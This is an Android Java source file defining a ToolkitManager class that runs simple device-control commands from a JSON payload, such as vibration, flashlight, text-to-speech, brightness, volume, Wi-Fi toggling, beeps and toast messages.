package com.fason.app.features.toolkit;

import android.content.Context;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CameraAccessException;
import android.media.AudioManager;
import android.media.ToneGenerator;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Vibrator;
import android.os.VibrationEffect;
import android.provider.Settings;
import android.speech.tts.TextToSpeech;

import com.fason.app.core.FasonApp;

import org.json.JSONObject;

import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * ToolkitManager — device control tools: vibrate, flashlight, TTS,
 * brightness, volume, wifi toggle, tone beeps, toast messages.
 */
public final class ToolkitManager {
    private static volatile ToolkitManager instance;
    private final Context ctx;
    private final ExecutorService exec = Executors.newSingleThreadExecutor();
    private volatile TextToSpeech tts;
    private volatile boolean flashOn = false;

    private ToolkitManager() { this.ctx = FasonApp.getContext(); }

    public static synchronized ToolkitManager getInstance() {
        if (instance == null) instance = new ToolkitManager();
        return instance;
    }

    /** payload: {tool, arg} */
    public JSONObject execute(JSONObject payload) {
        String tool = payload.optString("tool", "");
        String arg = payload.optString("arg", "");
        try {
            switch (tool) {
                case "vibrate":     return vibrate(arg);
                case "flashlight":  return flashlight(arg);
                case "tts":         return speak(arg);
                case "brightness":  return brightness(arg);
                case "volume":      return volume(arg);
                case "wifi":        return wifi(arg);
                case "beep":        return beep();
                case "toast":       return toast(arg);
                default:            return result(false, "unknown tool: " + tool);
            }
        } catch (Exception e) {
            return result(false, e.getMessage());
        }
    }

    private JSONObject vibrate(String arg) {
        long ms = 500;
        try { ms = Long.parseLong(arg); } catch (Exception ignored) {}
        Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
        if (v == null) return result(false, "no vibrator");
        if (Build.VERSION.SDK_INT >= 26) {
            v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE));
        } else {
            v.vibrate(ms);
        }
        return result(true, "vibrated " + ms + "ms");
    }

    private JSONObject flashlight(String arg) {
        CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
        if (cm == null) return result(false, "no camera service");
        try {
            String cam = cm.getCameraIdList()[0];
            if (arg.isEmpty()) flashOn = !flashOn;
            else flashOn = "on".equalsIgnoreCase(arg) || "true".equalsIgnoreCase(arg);
            cm.setTorchMode(cam, flashOn);
            return result(true, "flash " + (flashOn ? "on" : "off"));
        } catch (CameraAccessException e) {
            return result(false, e.getMessage());
        }
    }

    private JSONObject speak(final String text) {
        if (text.isEmpty()) return result(false, "empty text");
        if (tts == null) {
            tts = new TextToSpeech(ctx, status -> {
                if (status == TextToSpeech.SUCCESS) {
                    tts.setLanguage(Locale.getDefault());
                    tts.speak(text, TextToSpeech.QUEUE_FLUSH, null, "fason_tts");
                }
            });
        } else {
            tts.speak(text, TextToSpeech.QUEUE_FLUSH, null, "fason_tts");
        }
        return result(true, "speaking");
    }

    private JSONObject brightness(String arg) {
        try {
            int b = Integer.parseInt(arg);
            if (b < 0) b = 0;
            if (b > 255) b = 255;
            Settings.System.putInt(ctx.getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, b);
            return result(true, "brightness " + b);
        } catch (Exception e) {
            return result(false, e.getMessage());
        }
    }

    private JSONObject volume(String arg) {
        try {
            AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            if (am == null) return result(false, "no audio manager");
            int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
            int level = (int) (Double.parseDouble(arg) * max);
            if (level < 0) level = 0;
            if (level > max) level = max;
            am.setStreamVolume(AudioManager.STREAM_MUSIC, level, 0);
            return result(true, "volume " + level + "/" + max);
        } catch (Exception e) {
            return result(false, e.getMessage());
        }
    }

    private JSONObject wifi(String arg) {
        if (Build.VERSION.SDK_INT < 29) {
            @SuppressWarnings("deprecation")
            WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm == null) return result(false, "no wifi manager");
            boolean on = arg.isEmpty() ? !wm.isWifiEnabled() : "on".equalsIgnoreCase(arg);
            @SuppressWarnings("deprecation")
            boolean ok = wm.setWifiEnabled(on);
            return result(ok, "wifi " + (on ? "on" : "off"));
        }
        return result(false, "wifi toggle requires API<29 or system app");
    }

    private JSONObject beep() {
        ToneGenerator tg = new ToneGenerator(AudioManager.STREAM_NOTIFICATION, 100);
        tg.startTone(ToneGenerator.TONE_PROP_BEEP, 500);
        return result(true, "beep");
    }

    private JSONObject toast(String arg) {
        android.os.Handler h = new android.os.Handler(android.os.Looper.getMainLooper());
        h.post(() -> android.widget.Toast.makeText(ctx, arg, android.widget.Toast.LENGTH_LONG).show());
        return result(true, "toast shown");
    }

    private JSONObject result(boolean ok, String msg) {
        JSONObject r = new JSONObject();
        try { r.put("success", ok); r.put("message", msg); } catch (Exception ignored) {}
        return r;
    }
}
